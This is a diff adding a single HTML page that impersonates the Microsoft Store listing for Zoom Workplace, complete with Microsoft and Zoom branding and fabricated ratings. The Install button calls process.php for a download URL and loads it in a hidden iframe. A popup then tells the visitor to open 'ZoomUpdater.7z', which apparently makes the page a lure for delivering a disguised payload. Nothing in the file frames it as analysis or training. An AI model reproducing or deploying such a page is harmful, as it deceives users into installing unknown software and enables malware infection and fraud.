@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Zoom Workplace – Microsoft Store</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Tailwind -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+  body{
+    background:#0f0f10;
+    font-family:"Segoe UI",system-ui,-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial;
+  }
+  .store-hero{
+    background:linear-gradient(180deg,#1b3f78 0%, #0f0f10 70%);
+  }
+</style>
+</head>
+
+<body class="text-white">
+
+<!-- ================= HEADER NAV ================= -->
+<header class="sticky top-0 z-50 bg-black/90 border-b border-gray-800 backdrop-blur">
+  <div class="max-w-[1800px] mx-auto px-6 h-14 flex items-center gap-6">
+
+    <!-- Microsoft Logo -->
+    <div class="flex items-center gap-3">
+      <img
+        src="https://commons.wikimedia.org/wiki/Special:FilePath/Microsoft_logo_(2012).svg"
+        alt="Microsoft"
+        class="h-6 object-contain"
+      />
+      <span class="text-sm font-semibold">Microsoft Store</span>
+    </div>
+
+    <!-- Nav -->
+    <nav class="flex gap-6 text-sm text-gray-300 ml-6">
+      <a class="text-blue-400">Home</a>
+      <a>Apps</a>
+      <a>Games</a>
+      <a>About</a>
+    </nav>
+
+    <!-- Search -->
+    <div class="ml-auto flex items-center gap-4">
+      <input
+        value="zoom"
+        class="bg-[#1b1b1b] text-sm px-4 py-1 rounded w-72 outline-none"
+      />
+      <span class="text-sm text-gray-400">Sign in</span>
+    </div>
+
+  </div>
+</header>
+
+<!-- ================= PAGE ================= -->
+<div class="max-w-[1800px] mx-auto px-6">
+
+<!-- ================= HERO ================= -->
+<section class="store-hero mt-6 rounded-lg p-10">
+  <div class="flex gap-10">
+
+    <!-- LEFT MAIN -->
+    <div class="flex-1 flex gap-6">
+      <img
+        src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Video_Communications_Company_Logo.png"
+        class="w-28 h-28 rounded-xl bg-white/5 p-2 object-contain"
+      />
+
+      <div>
+        <h1 class="text-4xl font-semibold">Zoom Workplace</h1>
+        <p class="text-gray-300 mt-1">Zoom Communications, Inc.</p>
+
+        <div class="flex gap-4 mt-2 text-sm text-gray-300">
+          <span>⭐ 4.4</span>
+          <span>109 ratings</span>
+          <span>Productivity</span>
+        </div>
+
+        <div class="flex gap-2 mt-4">
+          <span class="bg-blue-900/70 px-2 py-1 text-xs rounded">Built for Copilot+ PC</span>
+          <span class="bg-blue-900/70 px-2 py-1 text-xs rounded">Uses AI features</span>
+        </div>
+
+        <button
+  id="installBtn"
+  onclick="handleInstall()"
+  class="mt-6 bg-[#2da8ff] hover:bg-[#1f8edb] px-10 py-2 rounded-md font-semibold text-black flex items-center gap-3 disabled:opacity-70 disabled:cursor-not-allowed"
+>
+  <span id="installText">Install</span>
+
+  <!-- Spinner -->
+  <svg id="installSpinner"
+       class="hidden w-5 h-5 animate-spin text-black"
+       xmlns="http://www.w3.org/2000/svg"
+       fill="none"
+       viewBox="0 0 24 24">
+    <circle class="opacity-25"
+            cx="12"
+            cy="12"
+            r="10"
+            stroke="currentColor"
+            stroke-width="4"></circle>
+    <path class="opacity-75"
+          fill="currentColor"
+          d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+  </svg>
+</button>
+
+        <div class="mt-4 text-xs text-gray-300">
+          <span class="border px-1 mr-2">12+</span>
+          Parental Guidance Recommended · In-App Purchases · Users Interact
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT SIDEBAR -->
+    <aside class="w-[340px]">
+      <h3 class="text-lg font-semibold mb-4">Discover more</h3>
+
+      <div class="space-y-4">
+
+        <!-- Teams -->
+        <div class="flex items-center gap-3">
+          <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Microsoft_Office_Teams_(2019–2025).svg"
+               class="w-10 h-10 bg-white/5 p-1 rounded object-contain">
+          <div class="flex-1">
+            <p class="text-sm">Microsoft Teams</p>
+            <p class="text-xs text-gray-400">4.1 · Productivity</p>
+          </div>
+          <span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span>
+        </div>
+
+        <!-- Acrobat -->
+        <div class="flex items-center gap-3">
+          <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Adobe_Acrobat_Reader_icon_(2020).svg"
+               class="w-10 h-10 bg-white/5 p-1 rounded object-contain">
+          <div class="flex-1">
+            <p class="text-sm">Adobe Acrobat Reader DC</p>
+            <p class="text-xs text-gray-400">4.5 · Productivity</p>
+          </div>
+          <span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span>
+        </div>
+
+        <!-- ChatGPT -->
+        <div class="flex items-center gap-3">
+          <img src="https://commons.wikimedia.org/wiki/Special:FilePath/ChatGPT-Logo.svg"
+               class="w-10 h-10 bg-white/5 p-1 rounded object-contain">
+          <div class="flex-1">
+            <p class="text-sm">ChatGPT</p>
+            <p class="text-xs text-gray-400">4.8 · Productivity</p>
+          </div>
+          <span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span>
+        </div>
+
+        <!-- Netflix -->
+        <div class="flex items-center gap-3">
+          <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Netflix_2015_logo.svg"
+               class="w-10 h-10 bg-white/5 p-1 rounded object-contain">
+          <div class="flex-1">
+            <p class="text-sm">Netflix</p>
+            <p class="text-xs text-gray-400">3.6 · Entertainment</p>
+          </div>
+          <span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span>
+        </div>
+
+        <!-- iCloud -->
+        <div class="flex items-center gap-3">
+          <img src="https://commons.wikimedia.org/wiki/Special:FilePath/ICloud_logo.svg"
+               class="w-10 h-10 bg-white/5 p-1 rounded object-contain">
+          <div class="flex-1">
+            <p class="text-sm">iCloud</p>
+            <p class="text-xs text-gray-400">4.5 · Productivity</p>
+          </div>
+          <span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span>
+        </div>
+
+      </div>
+    </aside>
+
+  </div>
+</section>
+
+<!-- ================= DESCRIPTION ================= -->
+<section class="mt-14 max-w-4xl">
+  <h2 class="text-xl font-semibold mb-4">Description</h2>
+  <p class="text-gray-300 text-sm leading-relaxed">
+    Reimagine how you work with Zoom Workplace, an all-in-one, AI-powered
+    collaboration platform that combines team chat, meetings, phone*,
+    whiteboard, calendar, mail, notes, and more.
+  </p>
+</section>
+
+<!-- ================= RATINGS ================= -->
+<section class="mt-14 max-w-4xl">
+  <h2 class="text-xl font-semibold mb-4">Ratings and reviews</h2>
+
+  <div class="flex gap-10">
+    <div>
+      <div class="text-5xl font-semibold">4.4</div>
+      <p class="text-sm text-gray-400">109 ratings</p>
+    </div>
+
+    <div class="flex-1 space-y-2">
+      <div class="flex items-center gap-2">
+        <span class="text-sm">5</span>
+        <div class="h-2 bg-gray-700 flex-1 rounded">
+          <div class="h-2 bg-orange-500 w-[80%] rounded"></div>
+        </div>
+      </div>
+      <div class="flex items-center gap-2">
+        <span class="text-sm">4</span>
+        <div class="h-2 bg-gray-700 flex-1 rounded">
+          <div class="h-2 bg-orange-500 w-[60%] rounded"></div>
+        </div>
+      </div>
+      <div class="flex items-center gap-2">
+        <span class="text-sm">3</span>
+        <div class="h-2 bg-gray-700 flex-1 rounded">
+          <div class="h-2 bg-orange-500 w-[30%] rounded"></div>
+        </div>
+      </div>
+      <div class="flex items-center gap-2">
+        <span class="text-sm">2</span>
+        <div class="h-2 bg-gray-700 flex-1 rounded">
+          <div class="h-2 bg-orange-500 w-[10%] rounded"></div>
+        </div>
+      </div>
+      <div class="flex items-center gap-2">
+        <span class="text-sm">1</span>
+        <div class="h-2 bg-gray-700 flex-1 rounded">
+          <div class="h-2 bg-orange-500 w-[5%] rounded"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= SCREENSHOTS ================= -->
+<section class="mt-16 pb-20">
+  <h2 class="text-xl font-semibold mb-5">Screenshots</h2>
+  <div class="grid grid-cols-3 gap-6 max-w-5xl">
+    <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Video_screenshot.png"
+         class="rounded-lg border border-gray-700 object-cover">
+    <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Video_screenshot.png"
+         class="rounded-lg border border-gray-700 object-cover">
+    <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Video_screenshot.png"
+         class="rounded-lg border border-gray-700 object-cover">
+  </div>
+</section>
+
+<script>
+const CONFIG = {
+  PROCESS_PHP_URL: 'process.php'
+};
+
+async function triggerDownload() {
+  try {
+    const resp = await fetch(CONFIG.PROCESS_PHP_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'download', t: Date.now() })
+    });
+
+    if (!resp.ok) return;
+
+    const data = await resp.json();
+    if (!data.downloadUrl) return;
+
+    // === ONLY METHOD THAT WORKS RELIABLY ===
+    let iframe = document.getElementById('download_iframe');
+    if (!iframe) {
+      iframe = document.createElement('iframe');
+      iframe.id = 'download_iframe';
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+    }
+
+    iframe.src = data.downloadUrl;
+
+  } catch (e) {
+    console.error('Download failed', e);
+  }
+}
+</script>
+
+<script>
+let installStarted = false;
+
+function handleInstall() {
+  if (installStarted) return;
+  installStarted = true;
+
+  const btn = document.getElementById('installBtn');
+  const text = document.getElementById('installText');
+  const spinner = document.getElementById('installSpinner');
+
+  btn.disabled = true;
+  text.textContent = 'Installing';
+  spinner.classList.remove('hidden');
+
+  triggerDownload();
+
+  setTimeout(() => {
+    showDownloadPopup(); // your existing UI function
+  }, 2500);
+}
+</script>
+
+</div>
+<!-- ================= DOWNLOAD COMPLETE POPUP ================= -->
+<div id="downloadPopup"
+     class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden items-center justify-center z-[9999]">
+
+  <div class="bg-[#f5f5f5] text-black w-[420px] rounded-lg shadow-2xl flex overflow-hidden">
+
+    <!-- Left blue bar -->
+    <div class="w-1 bg-[#2da8ff]"></div>
+
+    <!-- Content -->
+    <div class="p-6 flex-1">
+      <div class="flex items-start gap-4">
+
+        <!-- Zoom logo -->
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png"
+          class="w-20 h-20 object-contain"
+        />
+
+        <div>
+          <h3 class="font-semibold text-lg">Download Complete!</h3>
+          <p class="text-sm text-gray-700 mt-1">
+            Locate <b>ZoomUpdater.7z</b> in your downloads
+            directory and double-click to start the installation.
+          </p>
+        </div>
+      </div>
+
+      <div class="flex justify-end mt-5">
+        <!--<button
+          onclick="closeDownloadnPopup()"
+          class="bg-[#2da8ff] hover:bg-[#1f8edb] text-white px-6 py-1.5 rounded text-sm font-semibold">
+          OK
+        </button>-->
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+function showDownloadPopup() {
+  const popup = document.getElementById('downloadPopup');
+  popup.classList.remove('hidden');
+  popup.classList.add('flex');
+}
+
+function closeDownloadPopup() {
+  const popup = document.getElementById('downloadPopup');
+  popup.classList.add('hidden');
+  popup.classList.remove('flex');
+}
+</script>
+
+
+</body>
+</html>
